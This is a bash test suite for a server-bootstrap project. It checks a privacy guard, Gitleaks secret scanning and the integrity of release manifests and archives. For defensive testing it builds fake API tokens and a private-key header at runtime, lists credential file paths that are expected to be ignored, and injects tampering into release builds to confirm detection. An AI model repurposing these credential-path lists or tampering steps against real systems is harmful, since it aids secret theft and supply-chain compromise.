#!/usr/bin/env bash
set -Euo pipefail

ROOT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd -P)"
cd "$ROOT"
PASS=0; FAIL=0
# Set by the checksums/SHA256SUMS assertion, read by the Results section. See #41.
MANIFEST_STALE=0
TMP="$(mktemp -d)"; trap 'rm -rf "$TMP"' EXIT
ok(){ printf '  ok:   %s\n' "$1"; PASS=$((PASS+1)); }
bad(){ printf '  FAIL: %s\n' "$1"; FAIL=$((FAIL+1)); }
section(){ printf '\n== %s ==\n' "$1"; }
skip(){ printf '  skip: %s\n' "$1"; }

section "Syntax and structure"
while IFS= read -r file; do
    bash -n "$file" && ok "bash -n $file" || bad "syntax: $file"
done < <(find . -type f \( -name '*.sh' -o -name 'server-bundle-install' \
    -o -name 'server-vscode-extensions' -o -name 'server-secrets' -o -name 'server-profile' \
    -o -path './profiles/*/bin/*' \) -not -path './release/dist/*' | LC_ALL=C sort)
for file in lib/core.sh lib/archive.sh lib/bundle.sh \
    lib/bootstrap/config.sh lib/bootstrap/workspace.sh lib/bootstrap/packages.sh \
    lib/bootstrap/node.sh lib/bootstrap/ai_cli.sh lib/bootstrap/vscode.sh lib/bootstrap/uv.sh lib/bootstrap/python.sh lib/bootstrap/shell.sh \
    lib/bootstrap/github_cli.sh lib/bootstrap/ngrok.sh lib/bootstrap/runtime.sh lib/bootstrap/report.sh \
    lib/secrets-load.sh lib/bootstrap/secrets.sh lib/bootstrap/pi.sh; do
    [[ -f "$file" ]] && ok "module present: $file" || bad "missing module: $file"
done
for command in server-bootstrap.sh server-provision.sh server-bundle-install server-accept.sh server-vscode-extensions server-secrets \
    server-profile profiles/ml/install.sh profiles/ml/bin/ml-env profiles/ml/bin/ml-status profiles/ml/bin/ml-doctor \
    profiles/ml/bin/ml-preflight profiles/ml/bin/ml-jupyter tools/ml-lock.sh; do
    [[ -x "$command" ]] && ok "executable: $command" || bad "not executable: $command"
done

# Matching is case-insensitive substring, so "whisper" also covers
# faster-whisper et al. and "torch" covers pytorch.
auto_terms=(whisper transcribe torch)
term_hit=0
# Optional workloads live under profiles/, so the generic entry points stay neutral too.
for file in server-bootstrap.sh server-bundle-install server-profile server-provision.sh lib/*.sh lib/bootstrap/*.sh; do
    for term in "${auto_terms[@]}"; do
        if grep -qi -- "$term" "$file"; then bad "workload term '$term' in neutral code: $file"; term_hit=1; fi
    done
done
(( term_hit == 0 )) && ok "neutral runtime code"

# A fenced block that outlives the content it was going to hold renders as an
# empty box, which reads as a command somebody forgot to write down. README.md
# carried one between the --check exit-code paragraph and the --write paragraph
# from 845389f until #43: the prose absorbed what the block was for, the fence
# stayed. Cheap and deterministic to assert, so it is asserted over every
# tracked Markdown file rather than only the one that broke.
fence_drift=0
while IFS= read -r file; do
    python3 - "$file" <<'PY' || fence_drift=1
import sys
path = sys.argv[1]
lines = open(path, encoding="utf-8").read().split("\n")
opened = None
for number, line in enumerate(lines, 1):
    if not line.startswith("```"):
        continue
    if opened is None:
        opened = number
        continue
    if not any(x.strip() for x in lines[opened:number - 1]):
        print(f"  FAIL: empty fenced code block: {path}:{opened}-{number}")
        raise SystemExit(1)
    opened = None
if opened is not None:
    print(f"  FAIL: unclosed fenced code block: {path}:{opened}")
    raise SystemExit(1)
PY
done < <(git ls-files '*.md' 2>/dev/null | LC_ALL=C sort)
(( fence_drift == 0 )) && ok "no tracked Markdown file has an empty or unclosed code fence"

section "Security and privacy guards"
# Private-use wording, credential-shaped filenames, private-key material,
# high-signal markers and tracked build output are all enforced by
# tests/privacy-guard.sh, exercised against fixtures further down.
[[ -s .gitleaks.toml ]] && ok "Gitleaks policy is present" || bad "missing Gitleaks policy"
for allowed in '/root' '/workspace' 'localhost' '127\.0\.0\.1' '::1' \
    'example\.(?:com|org|net)' 'CHANGE_ME' 'EXAMPLE_TOKEN'; do
    grep -Fq -- "$allowed" .gitleaks.toml \
        && ok "allowlist entry is explicit: $allowed" \
        || bad "missing allowlist entry: $allowed"
done
if grep -Eq '(^|[[:space:]])(paths|regexes)[[:space:]]*=.*\.\*' .gitleaks.toml; then
    bad "Gitleaks allowlist contains a broad wildcard"
else
    ok "Gitleaks allowlist has no broad wildcard"
fi
for ignored in .env .env.local config/local.env credentials/api.token \
    .ssh/id_ed25519 .aws/credentials .npmrc .kube/config state.tfstate; do
    git check-ignore --no-index -q -- "$ignored" \
        && ok "credential/config artifact is ignored: $ignored" \
        || bad "credential/config artifact is not ignored: $ignored"
done
for visible in config.example.env examples/addon.env.example; do
    git check-ignore -q -- "$visible" \
        && bad "intentional example is ignored: $visible" \
        || ok "intentional example remains visible: $visible"
done
tracked_ignored=0
while IFS= read -r file; do
    if git check-ignore -q -- "$file"; then
        bad "tracked file is now ignored: $file"
        tracked_ignored=1
    fi
done < <(git ls-files)
(( tracked_ignored == 0 )) && ok "tracked files are not hidden by ignore rules"

# The guard is only worth having if it fires, so every policy is exercised
# against a fixture built at runtime. No fixture is ever committed: the
# secret-scan job reads full history, so a committed fake token could only be
# removed by rewriting history, which SECURITY.md forbids.
guard_root="$TMP/privacy-guard"
guard_out="$TMP/privacy-guard.out"
guard_run(){ ./tests/privacy-guard.sh --dir "$guard_root" >"$guard_out" 2>&1; }

[[ -x tests/privacy-guard.sh ]] \
    && ok "executable: tests/privacy-guard.sh" || bad "not executable: tests/privacy-guard.sh"

if ./tests/privacy-guard.sh >"$guard_out" 2>&1; then
    ok "privacy guard passes on the tracked repository"
else
    bad "privacy guard reports a violation on the tracked repository"
    sed 's/^/        /' "$guard_out"
fi

mkdir -p "$guard_root/examples"
printf 'no secrets here\n' > "$guard_root/README.md"
: > "$guard_root/config.example.env"
: > "$guard_root/examples/addon.env.example"
guard_run && ok "guard passes on the approved example templates" \
    || bad "guard rejects config.example.env or examples/addon.env.example"

# Deterministic, high-entropy and obviously synthetic: assembled here, asserted
# on, then deleted. Grepping this file finds a recipe, never a token.
fixture_token="sk-$(printf 'run-tests-privacy-fixture' | sha256sum | cut -c1-40)"
printf 'api_key = "%s"\n' "$fixture_token" > "$guard_root/service.conf"
if guard_run; then
    bad "guard missed a fake high-signal token"
else
    ok "guard fails on a fake high-signal token"
    grep -q 'vendor-credential-marker' "$guard_out" \
        && ok "guard names the violated policy" || bad "guard did not name the violated policy"
    grep -qF -- "$fixture_token" "$guard_out" \
        && bad "guard printed the secret value" || ok "guard reports without printing the value"
fi
rm -f "$guard_root/service.conf"
guard_run && ok "guard passes once the token fixture is removed" \
    || bad "guard still fails after the token fixture was removed"

# A PEM header assembled from fragments, for the same reason.
pem_begin='-----BEGIN'; pem_kind='RSA PRIVATE'; pem_end='KEY-----'
printf '%s %s %s\nMIIEowIBAAKCAQEA\n' "$pem_begin" "$pem_kind" "$pem_end" > "$guard_root/host.conf"
guard_run && bad "guard missed a private-key header" \
    || { ok "guard fails on a private-key header"; grep -q 'private-key-material' "$guard_out" \
        && ok "guard names the private-key policy" || bad "guard did not name the private-key policy"; }
rm -f "$guard_root/host.conf"

: > "$guard_root/production.env"
guard_run && bad "guard missed a prohibited filename" \
    || { ok "guard fails on a prohibited filename"; grep -q 'credential-or-config-filename' "$guard_out" \
        && ok "guard names the filename policy" || bad "guard did not name the filename policy"; }
rm -f "$guard_root/production.env"

mkdir -p "$guard_root/release/dist"
: > "$guard_root/release/dist/server-bootstrap-0.0.0.tar.gz"
guard_run && bad "guard missed tracked release output" \
    || { ok "guard fails when release/dist is in the tracked set"; grep -q 'generated-artifact-tracked' "$guard_out" \
        && ok "guard names the generated-artifact policy" || bad "guard did not name the artifact policy"; }
rm -rf "$guard_root/release"

guard_run && ok "guard is clean again once every fixture is removed" \
    || bad "guard is not stable across repeated runs"

grep -q 'STEP=acceptance' server-bootstrap.sh && grep -q 'STEP=addon' server-bootstrap.sh \
    && [[ "$(grep -n 'STEP=acceptance' server-bootstrap.sh | cut -d: -f1)" -lt "$(grep -n 'STEP=addon' server-bootstrap.sh | cut -d: -f1)" ]] \
    && ok "acceptance precedes optional add-on" || bad "acceptance ordering"

section "Release scanning"
# Structural assertions: every tree that becomes a release asset is scanned, the
# gate sits between build and upload, and there is exactly one scanner pin.
while IFS='|' read -r label expect; do
    [[ -n "$label" ]] || continue
    grep -qF -- "$expect" release/build-release.sh \
        && ok "release build scans the $label" \
        || bad "release build does not scan the $label"
done <<'SCANS'
source staging tree|scan_release_tree "$source_stage" "source staging tree"
extracted tar.gz|scan_release_tree "$verify" "extracted $NAME-$VERSION.tar.gz"
extracted zip|scan_release_tree "$unpack_zip" "extracted $NAME-$VERSION.zip"
extracted source zip|scan_release_tree "$unpack_src" "extracted $NAME-$VERSION-source.zip"
release/dist sidecars, manifest and standalone files|scan_release_tree "$DIST" "release/dist staging" scan-artifacts
SCANS
grep -qF 'rm -rf "$DIST"' release/build-release.sh \
    && grep -qF 'discarding' release/build-release.sh \
    && ok "a failed scan discards the staged release" \
    || bad "a failed scan leaves release/dist in place"
# Re-hashing after the scans now covers all four release archives, not the three
# it used to name: the source zip was outside it, so bytes appended to that
# asset after creation survived to upload. See #47.
grep -qF 'release archives changed after the reproducibility gate' release/build-release.sh \
    && grep -qF 'hash_artifacts "$DIST"' release/build-release.sh \
    && ok "all four release archives are re-verified after scanning" \
    || bad "nothing re-verifies all four release archives after the scans"
grep -qF '"release_scan": "$SCAN_STATUS"' release/build-release.sh \
    && ok "the release manifest records the scan result" \
    || bad "the release manifest does not record the scan result"

# The upload gate must still come after the build and before the publish
# action. Both moved into tools/release-preflight.sh, so the ordering is
# asserted in two parts: the preflight runs before Publish assets, and inside it
# the artifact scan runs after the build. Comment lines are stripped from both,
# so a step described in prose cannot stand in for one that runs.
release_body="$(grep -vE '^[[:space:]]*#' .github/workflows/release.yml)"
preflight_body="$(grep -vE '^[[:space:]]*#' tools/release-preflight.sh)"
preflight_at="$(grep -nF 'bash tools/release-preflight.sh' <<< "$release_body" | cut -d: -f1 | head -1)"
publish_at="$(grep -nF 'name: Publish assets' <<< "$release_body" | cut -d: -f1 | head -1)"
build_at="$(grep -nF 'release/build-release.sh' <<< "$preflight_body" | cut -d: -f1 | head -1)"
gate_at="$(grep -nF 'scan-artifacts release/dist' <<< "$preflight_body" | cut -d: -f1 | head -1)"
if [[ -n "$preflight_at" && -n "$publish_at" ]] && (( preflight_at < publish_at )); then
    ok "release.yml runs the preflight before uploading"
else
    bad "release.yml uploads without running the preflight first"
fi
if [[ -n "$build_at" && -n "$gate_at" ]] && (( build_at < gate_at )); then
    ok "the preflight scans release/dist after building it"
else
    bad "the preflight has no artifact scan after the build"
fi

# One pin, reused. A second hardcoded version or checksum is how the CI scanner
# and the release scanner silently drift apart.
grep -qE '^GITLEAKS_VERSION=[0-9]+\.[0-9]+\.[0-9]+$' tools/gitleaks.sh \
    && ok "tools/gitleaks.sh pins an exact Gitleaks version" \
    || bad "tools/gitleaks.sh does not pin an exact version"
grep -qE '^GITLEAKS_SHA256_LINUX_X64=[0-9a-f]{64}$' tools/gitleaks.sh \
    && ok "tools/gitleaks.sh pins a release checksum" \
    || bad "tools/gitleaks.sh does not pin a release checksum"
pin_drift=0
for file in .github/workflows/ci.yml .github/workflows/release.yml \
    tools/release-preflight.sh release/build-release.sh; do
    grep -qE 'gitleaks_[0-9]+\.[0-9]+\.[0-9]+_linux|GITLEAKS_SHA256' "$file" \
        && { bad "$file carries its own Gitleaks pin"; pin_drift=1; }
done
for file in .github/workflows/ci.yml tools/release-preflight.sh; do
    grep -qF 'tools/gitleaks.sh' "$file" \
        || { bad "$file does not scan through tools/gitleaks.sh"; pin_drift=1; }
done
# release.yml reaches the scanner only through the preflight. Invoking it
# directly would be a release-only path again, which is what #26 removed.
grep -qF 'tools/gitleaks.sh' .github/workflows/release.yml \
    && { bad "release.yml invokes the scanner directly instead of through the preflight"; pin_drift=1; }
(( pin_drift == 0 )) && ok "every caller reaches the scanner through the single pinned helper"
grep -qF 'tools/gitleaks.sh' release/build-release.sh \
    && ok "the release build scans through the single pinned helper" \
    || bad "the release build does not use the pinned helper"

# Functional checks, only when a matching binary is already present. Downloading
# one here would make the suite require network access, which it must not.
pinned_version="$(bash tools/gitleaks.sh version)"
gitleaks_ready=""
for candidate in "${GITLEAKS_BIN:-}" "$(command -v gitleaks 2>/dev/null || true)"; do
    [[ -n "$candidate" && -x "$candidate" ]] || continue
    [[ "$("$candidate" version 2>/dev/null)" == "$pinned_version" ]] || continue
    gitleaks_ready="$candidate"; break
done

if [[ -z "$gitleaks_ready" ]]; then
    skip "release scan behaviour (no pinned Gitleaks v$pinned_version available offline)"
else
    export GITLEAKS_BIN="$gitleaks_ready"
    scan_root="$TMP/release-scan"
    mkdir -p "$scan_root/payload"
    printf 'nothing to see\n' > "$scan_root/payload/README.md"
    bash tools/gitleaks.sh scan-dir "$scan_root/payload" "fixture" >/dev/null 2>&1 \
        && ok "release scan passes on a clean staging tree" \
        || bad "release scan fails on a clean staging tree"

    # Same fixture recipe as the privacy guard: built here, never committed.
    scan_token="sk-$(printf 'release-scan-fixture' | sha256sum | cut -c1-40)"
    printf 'api_key = "%s"\n' "$scan_token" > "$scan_root/payload/service.conf"
    bash tools/gitleaks.sh scan-dir "$scan_root/payload" "fixture" >"$TMP/scan.out" 2>&1 \
        && bad "release scan missed a fake token in a staging tree" \
        || ok "release scan fails on a fake token in a staging tree"
    grep -qF -- "$scan_token" "$TMP/scan.out" \
        && bad "release scan printed the secret value" \
        || ok "release scan reports without printing the value"

    # The pre-upload gate must see inside an archive: a flat scan of a directory
    # of tarballs reads zero bytes and would pass anything.
    mkdir -p "$scan_root/dist"
    ( cd "$scan_root" && tar -czf dist/bundle.tar.gz payload )
    rm -f "$scan_root/payload/service.conf"
    bash tools/gitleaks.sh scan-artifacts "$scan_root/dist" "fixture artifacts" >/dev/null 2>&1 \
        && bad "artifact scan missed a fake token inside an archive" \
        || ok "artifact scan fails on a fake token inside an archive"
    bash tools/gitleaks.sh scan-dir "$scan_root/dist" "fixture artifacts" >/dev/null 2>&1 \
        && ok "a flat scan cannot see inside an archive (why the gate uses scan-artifacts)" \
        || bad "flat-scan control behaved unexpectedly"
    rm -rf "$scan_root"
fi

section "Fitness: the release file set and checksums/SHA256SUMS"
# release/build-release.sh used to walk the working tree with three separate
# `find .` passes, so an untracked scratch file in a contributor's checkout was
# hashed into checksums/SHA256SUMS and packed into the tar, the zip and the
# source zip -- and every gate stayed green, because a check that only asks
# whether every tracked file is present cannot see an extra entry. The set is
# now resolved once by release/release-files.sh and consumed by all of them.
# See #24.
release_files_out="$(bash release/release-files.sh verify 2>&1)" \
    && ok "checksums/SHA256SUMS matches the release file set" \
    || { bad "release-files verify: $release_files_out"; MANIFEST_STALE=1; }
[[ "$(bash release/release-files.sh source 2>/dev/null)" == git ]] \
    && ok "a git checkout resolves the release set from the tracked files" \
    || bad "a git checkout did not resolve the release set from git"
# The generation must stay where the tests think it is: this cannot start
# passing because the manifest quietly moved to being written somewhere else.
grep -q 'release-files.sh" write' release/build-release.sh \
    && grep -q 'release-files.sh" list' release/build-release.sh \
    && ok "the release build generates the manifest and the archives from one set" \
    || bad "release/build-release.sh no longer uses the canonical release set"
grep -qE "find \. -type f -not -path './release/dist/\*'" release/build-release.sh \
    && bad "release/build-release.sh still walks the working tree for release content" \
    || ok "no working-tree walk is left in the release content path"

# Synthetic repositories, built with git init + git add: the index is what
# git ls-files reads, so no commit and no user identity is needed, and nothing
# here touches the network or the real tree. One tracked path deliberately
# contains a space, because the manifest format splits on a fixed 64-hex + two
# space prefix and a whitespace split would corrupt it.
release_fixture() {
    local dir i
    dir="$(mktemp -d "$TMP/relset.XXXXXX")"
    mkdir -p "$dir/lib" "$dir/docs"
    printf 'alpha\n' > "$dir/alpha.txt"
    printf 'beta\n' > "$dir/lib/beta.sh"
    printf 'spaced\n' > "$dir/a file with spaces.txt"
    for i in $(seq -w 1 25); do printf 'doc %s\n' "$i" > "$dir/docs/page-$i.md"; done
    git -c init.defaultBranch=main init -q "$dir"
    git -C "$dir" add -A
    bash release/release-files.sh --root "$dir" write >/dev/null
    git -C "$dir" add -A
    printf '%s\n' "$dir"
}
release_reject() {  # label, expected finding fragment, root
    local label="$1" fragment="$2" root="$3" out
    if out="$(bash release/release-files.sh --root "$root" verify 2>&1)"; then
        bad "release-files accepted $label"
        return
    fi
    grep -qF -- "$fragment" <<< "$out" \
        && ok "release-files rejects $label" \
        || bad "release-files rejected $label, but not for '$fragment': $out"
}

root="$(release_fixture)"
bash release/release-files.sh --root "$root" verify >/dev/null 2>&1 \
    && ok "a clean synthetic tree verifies" || bad "a clean synthetic tree does not verify"
grep -q '  a file with spaces\.txt$' "$root/checksums/SHA256SUMS" \
    && ok "a path containing spaces round-trips through the manifest" \
    || bad "a path containing spaces did not round-trip"

# The case this issue exists for. The file must be absent from the set, and the
# manifest must still verify -- an untracked scratch file in a contributor's
# checkout is not a release problem and must not be reported as one.
root="$(release_fixture)"
printf 'local scratch\n' > "$root/scratch-probe.tmp"
mkdir -p "$root/notes"; printf 'private\n' > "$root/notes/private-note.txt"
if bash release/release-files.sh --root "$root" list 2>/dev/null \
    | tr '\0' '\n' | grep -qE 'scratch-probe|private-note'; then
    bad "an untracked file is in the release set"
else
    ok "an untracked file is not in the release set"
fi
bash release/release-files.sh --root "$root" verify >/dev/null 2>&1 \
    && ok "an untracked file does not fail the manifest check" \
    || bad "an untracked file falsely failed the manifest check"

root="$(release_fixture)"; printf 'changed\n' >> "$root/alpha.txt"
release_reject "a modified tracked file" "stale hash: alpha.txt" "$root"

root="$(release_fixture)"; rm -- "$root/lib/beta.sh"
release_reject "a tracked file deleted from disk" "recorded but not on disk: lib/beta.sh" "$root"

root="$(release_fixture)"; sed -i '/  alpha\.txt$/d' "$root/checksums/SHA256SUMS"
release_reject "a missing manifest entry" "missing from the manifest: alpha.txt" "$root"

# Only reachable because the comparison is exact in both directions. A check
# that asks only "is every tracked file recorded" passes this.
root="$(release_fixture)"
printf '%064d  zzz-not-in-the-release.txt\n' 0 >> "$root/checksums/SHA256SUMS"
release_reject "an extra manifest entry" "not part of the release: zzz-not-in-the-release.txt" "$root"

root="$(release_fixture)"
duplicate_line="$(grep '  alpha\.txt$' "$root/checksums/SHA256SUMS")"
printf '%s\n' "$duplicate_line" >> "$root/checksums/SHA256SUMS"
release_reject "a duplicated manifest entry" "duplicate entry: alpha.txt" "$root"

root="$(release_fixture)"
sed -i "s|^[0-9a-f]\{64\}\(  alpha\.txt\)$|$(printf '%064d' 0)\1|" "$root/checksums/SHA256SUMS"
release_reject "an incorrect hash" "stale hash: alpha.txt" "$root"

root="$(release_fixture)"
python3 - "$root/checksums/SHA256SUMS" <<'SWAP'
import sys
path = sys.argv[1]
lines = open(path).read().splitlines()
lines[0], lines[1] = lines[1], lines[0]
open(path, 'w').write("".join(l + "\n" for l in lines))
SWAP
release_reject "a misordered manifest" "manifest is not sorted" "$root"

# A single bogus line must not bury the rest of the suite: 28 files means 29
# findings, and the report is capped.
root="$(release_fixture)"
printf 'deadbeef  alpha.txt\n' > "$root/checksums/SHA256SUMS"
bogus_out="$(bash release/release-files.sh --root "$root" verify 2>&1 || true)"
grep -qF 'malformed line 1' <<< "$bogus_out" \
    && grep -qF '... and ' <<< "$bogus_out" \
    && (( $(wc -l <<< "$bogus_out") <= 25 )) \
    && ok "a one-line bogus manifest fails with capped output" \
    || bad "a one-line bogus manifest was not reported as expected: $bogus_out"

# A path that GNU sha256sum would have to escape is refused rather than encoded,
# because the escaping makes the format ambiguous to every naive parser.
root="$(release_fixture)"
printf 'odd\n' > "$root/back\\slash.txt"
git -C "$root" add -A
backslash_out="$(bash release/release-files.sh --root "$root" list 2>&1 || true)"
grep -qF 'needs escaping in a checksum manifest' <<< "$backslash_out" \
    && ok "a path needing checksum escaping is refused" \
    || bad "a path with a backslash was not refused: $backslash_out"

# In source-bundle mode the manifest is an input, so it decides what gets hashed
# and packed: a path climbing out of the tree, or an empty manifest, must be
# refused rather than acted on.
root="$(release_fixture)"; rm -rf "$root/.git"
printf '%064d  ../outside-the-tree.txt\n' 0 >> "$root/checksums/SHA256SUMS"
escape_out="$(bash release/release-files.sh --root "$root" list 2>&1 || true)"
grep -qF 'release path escapes the tree' <<< "$escape_out" \
    && ok "a manifest path climbing out of the tree is refused" \
    || bad "a manifest path with .. was not refused: $escape_out"

root="$(release_fixture)"; rm -rf "$root/.git"; : > "$root/checksums/SHA256SUMS"
if bash release/release-files.sh --root "$root" list >/dev/null 2>&1; then
    bad "an empty manifest still produced a release set"
else
    ok "an empty manifest is refused"
fi

# The unpacked-source-bundle shape: no .git, so the set comes from the manifest
# the bundle already ships. It is a weaker input and says so.
root="$(release_fixture)"; rm -rf "$root/.git"
[[ "$(bash release/release-files.sh --root "$root" source 2>/dev/null)" == manifest ]] \
    && ok "a source bundle resolves the release set from the shipped manifest" \
    || bad "a source bundle did not fall back to the manifest"
bundle_out="$(bash release/release-files.sh --root "$root" verify 2>&1)"
grep -qF 'tracked-set comparison is unavailable' <<< "$bundle_out" \
    && ok "the manifest fallback is announced, not silent" \
    || bad "the manifest fallback was silent: $bundle_out"

# And with neither, it must refuse rather than fall back to walking the tree,
# which is the behaviour this whole section exists to remove.
root="$(release_fixture)"; rm -rf "$root/.git" "$root/checksums/SHA256SUMS"
if bash release/release-files.sh --root "$root" list >/dev/null 2>&1; then
    bad "a tree with no .git and no manifest still produced a release set"
else
    ok "a tree with no .git and no manifest is refused"
fi

# --- the stale-manifest remedy (#41) ---------------------------------------
# Dependabot edits a tracked workflow file and cannot run the regeneration
# command, so every one of its pull requests opens with a stale manifest and
# three red jobs. The verification is correct and is deliberately untouched
# above; what is tested here is that the failure explains itself. The hint
# script is exercised against a synthetic tree, never the real checkout, so a
# failing assertion cannot leave this repository's manifest rewritten.
hint_fixture() {  # -> a synthetic root carrying both scripts
    local dir; dir="$(release_fixture)"
    mkdir -p "$dir/tools" "$dir/release"
    cp tools/manifest-fix-hint.sh "$dir/tools/"
    cp release/release-files.sh "$dir/release/"
    git -C "$dir" add -A
    bash release/release-files.sh --root "$dir" write >/dev/null
    git -C "$dir" add -A
    printf '%s\n' "$dir"
}

root="$(hint_fixture)"
hint_out="$(bash "$root/tools/manifest-fix-hint.sh" 2>&1)"; hint_code=$?
(( hint_code == 0 )) \
    && ok "the manifest hint exits 0 on a current manifest" \
    || bad "the manifest hint exited $hint_code on a current manifest"
grep -qF 'is current' <<< "$hint_out" \
    && ok "the manifest hint says nothing is stale when nothing is stale" \
    || bad "the manifest hint did not report a current manifest: $hint_out"

# The Dependabot shape: a tracked file changes, the manifest does not.
root="$(hint_fixture)"
before="$(sha256sum "$root/checksums/SHA256SUMS" | awk '{print $1}')"
printf 'bumped\n' >> "$root/lib/beta.sh"
hint_out="$(bash "$root/tools/manifest-fix-hint.sh" 2>&1)"; hint_code=$?
(( hint_code == 0 )) \
    && ok "the manifest hint exits 0 on a stale manifest, so it is never a gate" \
    || bad "the manifest hint exited $hint_code on a stale manifest"
grep -qF 'bash release/release-files.sh write' <<< "$hint_out" \
    && ok "the manifest hint names the exact regeneration command" \
    || bad "the manifest hint did not name the command: $hint_out"
grep -qF 'stale hash: lib/beta.sh' <<< "$hint_out" \
    && ok "the manifest hint names the file that went stale" \
    || bad "the manifest hint did not name the stale file: $hint_out"
grep -qE '^\+[0-9a-f]{64}  lib/beta\.sh$' <<< "$hint_out" \
    && ok "the manifest hint prints the patch that fixes it" \
    || bad "the manifest hint printed no fixing patch: $hint_out"
# The property that makes it safe to run from CI: it regenerates to show the
# diff, then puts the file back exactly as it found it.
[[ "$(sha256sum "$root/checksums/SHA256SUMS" | awk '{print $1}')" == "$before" ]] \
    && ok "the manifest hint restores the manifest byte-for-byte" \
    || bad "the manifest hint left the manifest rewritten"
# It is a diagnostic, not a fix: the tree it ran on is still correctly rejected.
bash release/release-files.sh --root "$root" verify >/dev/null 2>&1 \
    && bad "running the hint made a stale manifest verify" \
    || ok "running the hint does not make a stale manifest verify"

# The suite's own last word. A remedy printed 300 assertions up the log is not
# where anyone looks; this asserts it is also emitted after the PASS/FAIL line.
grep -q 'MANIFEST_STALE=1' tests/run-tests.sh \
    && grep -q 'if (( MANIFEST_STALE )); then' tests/run-tests.sh \
    && ok "a stale manifest is flagged for the Results section" \
    || bad "the stale-manifest flag is no longer wired to the Results section"

# --- all four release archives are inside the reproducibility gate (#47) ---
# The source zip is uploaded by release.yml, but it used to be built once,
# after the two-pass comparison, and appeared in neither the comparison, the
# manifest, the human summary nor the final re-verification. Bytes could be
# appended to it after creation and the build still exited 0 reporting
# "reproducible: true". Separately, both zips carried MS-DOS local-time fields,
# so their bytes depended on the builder's timezone while the same "true" was
# printed. These drive the real script, because the defect was that the gate
# did not cover what its output claimed.
#
# Scans are off and the suite is skipped in these fixtures: a scan-free build is
# about a second, and running the suite would recurse into this file.
release_build_fixture() {  # -> a disposable copy of the tracked tree
    local dir; dir="$(mktemp -d "$TMP/relbuild.XXXXXX")"
    git ls-files -z | tar --null -T - -cf - | tar -xf - -C "$dir"
    printf '%s\n' "$dir"
}
release_build() {  # dir, TZ -> build output on stdout+stderr, exit code preserved
    ( cd "$1" && SB_RELEASE_SCAN=0 TZ="${2:-UTC}" bash release/build-release.sh --skip-tests 2>&1 )
}
artifact_hashes() {  # dir -> "<name> <sha>" for each of the four archives
    local d="$1/release/dist" v; v="$(tr -d '[:space:]' < VERSION)"
    ( cd "$d" 2>/dev/null && sha256sum "server-bootstrap-$v.tar" "server-bootstrap-$v.tar.gz" \
        "server-bootstrap-$v.zip" "server-bootstrap-$v-source.zip" 2>/dev/null \
        | awk '{print $2" "$1}' | LC_ALL=C sort )
}

# 1. The timezone property, end to end through the real builder.
tz_a="$(release_build_fixture)"; tz_b="$(release_build_fixture)"
release_build "$tz_a" UTC          >/dev/null 2>&1
release_build "$tz_b" Europe/Paris >/dev/null 2>&1
if [[ -n "$(artifact_hashes "$tz_a")" && "$(artifact_hashes "$tz_a")" == "$(artifact_hashes "$tz_b")" ]]; then
    ok "all four release archives are byte-identical under TZ=UTC and TZ=Europe/Paris"
else
    bad "release archives depend on the builder's timezone: $(diff <(artifact_hashes "$tz_a") <(artifact_hashes "$tz_b") | tr '\n' ' ')"
fi
# And the mechanism that guarantees it, so a future edit cannot drop it silently.
[[ "$(grep -c 'TZ=UTC zip -X -q' release/build-release.sh)" == 2 ]] \
    && ok "both zip steps pin TZ=UTC" \
    || bad "a zip step in release/build-release.sh no longer pins TZ=UTC"

# 2. A source zip that differs between passes must fail the gate. Appending the
#    output directory is deterministic and differs by construction: pass 1
#    writes to release/dist, pass 2 to a scratch directory.
fx="$(release_build_fixture)"
python3 - "$fx/release/build-release.sh" <<'PY'
import sys
p=sys.argv[1]; t=open(p).read()
a='    rm -rf "$source_stage"\n'
assert t.count(a)==1
t=t.replace(a, a+'    printf %s "$outdir" >> "$outdir/$NAME-$VERSION-source.zip"\n',1)
open(p,'w').write(t)
PY
out="$(release_build "$fx")" && rc=0 || rc=$?
(( rc != 0 )) && grep -qF 'not reproducible' <<< "$out" \
    && ok "a source zip that differs between passes fails the reproducibility gate" \
    || bad "a differing source zip did not fail the gate (rc=$rc)"

# 3. A missing source zip must fail rather than be skipped over.
fx="$(release_build_fixture)"
python3 - "$fx/release/build-release.sh" <<'PY'
import sys
p=sys.argv[1]; t=open(p).read()
a='    rm -rf "$source_stage"\n'
t=t.replace(a, a+'    rm -f "$outdir/$NAME-$VERSION-source.zip"\n',1)
open(p,'w').write(t)
PY
out="$(release_build "$fx")" && rc=0 || rc=$?
(( rc != 0 )) && grep -qF 'build produced no' <<< "$out" \
    && ok "a missing source zip fails the build" \
    || bad "a missing source zip did not fail the build (rc=$rc)"

# 4. Tampering after the gate must be caught by the final re-verification --
#    the case that previously shipped a corrupt asset with exit 0.
fx="$(release_build_fixture)"
python3 - "$fx/release/build-release.sh" <<'PY'
import sys
p=sys.argv[1]; t=open(p).read()
a='if [[ "$(hash_artifacts "$DIST")" != "$hashes_1" ]]; then'
assert t.count(a)==1
t=t.replace(a, 'printf TAMPER >> "$DIST/$NAME-$VERSION-source.zip"\n'+a,1)
open(p,'w').write(t)
PY
out="$(release_build "$fx")" && rc=0 || rc=$?
(( rc != 0 )) && grep -qF 'changed after the reproducibility gate' <<< "$out" \
    && ok "source-zip tampering after the gate fails final verification" \
    || bad "source-zip tampering after the gate was not detected (rc=$rc)"

# 5. --skip-tests must never be reported as a suite that passed.
fx="$(release_build_fixture)"
release_build "$fx" >/dev/null 2>&1
manifest="$fx/release/dist/server-bootstrap-$(tr -d '[:space:]' < VERSION)-release-manifest.json"
if [[ -f "$manifest" ]]; then
    grep -qF '"tests": "skipped"' "$manifest" \
        && ok "--skip-tests records tests as skipped, not passed" \
        || bad "--skip-tests reported: $(grep -o '"tests": "[a-z]*"' "$manifest")"
    grep -qF '"source_zip_sha256"' "$manifest" \
        && ok "the release report carries the source zip's sha256" \
        || bad "the release report omits source_zip_sha256"
else
    bad "no release manifest produced by the --skip-tests build"
fi
# The literal cannot come back, the same way release_scan is guarded.
grep -qF '"tests": "$TESTS_STATUS"' release/build-release.sh \
    && ok "the manifest interpolates the tests status instead of hardcoding it" \
    || bad "release/build-release.sh hardcodes the manifest tests status again"
grep -qF 'source sha256' release/build-release.sh \
    && ok "the human summary prints the source zip's sha256" \
    || bad "the human summary no longer prints the source zip's sha256"

# The keyed version manifest must EQUAL its canonical mapping. Checking only
# that a row's value is a recognised pin let an unknown key ride on a valid
# version -- "@evil-corp/backdoor-agent <claude-code's pin>" passed, because
# that version really is pinned. Every rejection class is driven here against a
# scratch tree, never the real checksums, and both the expected mapping and
# these fixtures read the pins from the repository, so a coordinated bump
# changes nothing in this file. See #47.
